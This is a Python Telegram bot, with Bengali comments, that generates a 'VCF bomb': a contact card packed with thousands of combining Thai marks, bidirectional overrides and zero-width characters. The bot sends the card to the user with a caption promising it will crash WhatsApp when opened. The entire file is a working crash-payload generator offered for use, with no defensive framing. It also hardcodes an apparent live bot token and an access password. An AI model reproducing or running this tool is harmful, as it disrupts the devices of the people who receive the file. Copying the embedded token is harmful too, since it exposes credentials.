import logging
import os
import time
from telegram import Update, ReplyKeyboardMarkup, KeyboardButton, ReplyKeyboardRemove
from telegram.ext import Application, MessageHandler, filters, ContextTypes, ConversationHandler

# ১. লগিং সেটআপ
logging.basicConfig(level=logging.WARNING)

# ২. কনফিগারেশন
TOKEN = "8675593212:AAG6_m5ZFEqG-qkutygxbuoOetMv9N87TnY"
CORRECT_PASSWORD = "MIZANUR RAHMAN"

WAITING_FOR_PASSWORD = 1
WAITING_FOR_FILENAME = 2

# ৩. কন্টাক্ট (VCF) পেলোড জেনারেটর - এটি সরাসরি হোয়াটসঅ্যাপে ওপেন হবে
async def generate_vcf_bomb(filename, status_msg):
    if not filename.endswith(".vcf"):
        filename += ".vcf"
    
    # অতি শক্তিশালী ক্রাশ কোড (এটি হোয়াটসঅ্যাপ কন্টাক্ট কার্ডকে জ্যাম করে দেয়)
    crash_pattern = (
        "\u0E47\u0E48\u0E49\u0E4A\u0E4B\u0E4C\u0E4D" * 500 + 
        "\u202E\u202D" * 300 +                             
        "\u200B\u200C\u200D\uFEFF" * 400                   
    )
    
    # VCF ফরম্যাট যা হোয়াটসঅ্যাপ নিজের ভেতরেই রিড করে
    vcf_content = f"""BEGIN:VCARD
VERSION:3.0
N:🔥 M R DEVELOPER;{crash_pattern};;;
FN:☢️ {filename} ☢️
TEL;TYPE=CELL:{crash_pattern}
item1.ADR:;;{crash_pattern};;;;
item1.X-ABLabel:
END:VCARD
"""
    
    try:
        await status_msg.edit_text(f"🚀 কন্টাক্ট বোমা তৈরি হচ্ছে: '{filename}'...")
        with open(filename, "w", encoding="utf-8") as f:
            # ফাইলের ঘনত্ব বাড়াতে ১০ বার লুপ
            for _ in range(10):
                f.write(vcf_content)
        return filename
    except Exception:
        return None

# ৪. হ্যান্ডলার ফাংশনসমূহ
async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    keyboard = [[KeyboardButton("🚀 CREATE VCF BOMB")]]
    reply_markup = ReplyKeyboardMarkup(keyboard, resize_keyboard=True)
    await update.message.reply_text("🔥 **M R DEVELOPER VCF PANEL** 🔥\nএটি সরাসরি হোয়াটসঅ্যাপে ফাটবে!", reply_markup=reply_markup)
    return ConversationHandler.END

async def ask_password(update: Update, context: ContextTypes.DEFAULT_TYPE):
    await update.message.reply_text("🔑 **পাসওয়ার্ড দিন:**", reply_markup=ReplyKeyboardRemove())
    return WAITING_FOR_PASSWORD

async def check_password(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if update.message.text == CORRECT_PASSWORD:
        await update.message.reply_text("✅ ওকে! ফাইলের নাম দিন (যেমন: `Saved_Contact`):")
        return WAITING_FOR_FILENAME
    await update.message.reply_text("❌ ভুল!")
    return WAITING_FOR_PASSWORD

async def create_and_send(update: Update, context: ContextTypes.DEFAULT_TYPE):
    custom_name = update.message.text.strip().replace(" ", "_")
    status = await update.message.reply_text("☢️ বারুদ ইনজেক্ট করা হচ্ছে...")
    
    path = await generate_vcf_bomb(custom_name, status)
    
    if path:
        with open(path, 'rb') as doc:
            await update.message.reply_document(
                document=doc, 
                caption=f"✅ **DIRECT WHATSAPP BOMB READY!**\n\nএটি কন্টাক্ট ফাইল, তাই ক্লিক করলেই হোয়াটসঅ্যাপের ভেতর ওপেন হবে এবং অ্যাপ ক্রাশ করবে।"
            )
        os.remove(path)
    
    await status.delete()
    return ConversationHandler.END

def main():
    app = Application.builder().token(TOKEN).build()
    conv = ConversationHandler(
        entry_points=[MessageHandler(filters.Regex('^🚀 CREATE VCF BOMB$'), ask_password)],
        states={
            WAITING_FOR_PASSWORD: [MessageHandler(filters.TEXT & ~filters.COMMAND, check_password)],
            WAITING_FOR_FILENAME: [MessageHandler(filters.TEXT & ~filters.COMMAND, create_and_send)],
        },
        fallbacks=[MessageHandler(filters.COMMAND, start)],
    )
    app.add_handler(conv)
    app.add_handler(MessageHandler(filters.Regex('^/start$'), start))
    app.run_polling()

if __name__ == '__main__':
    main()
    
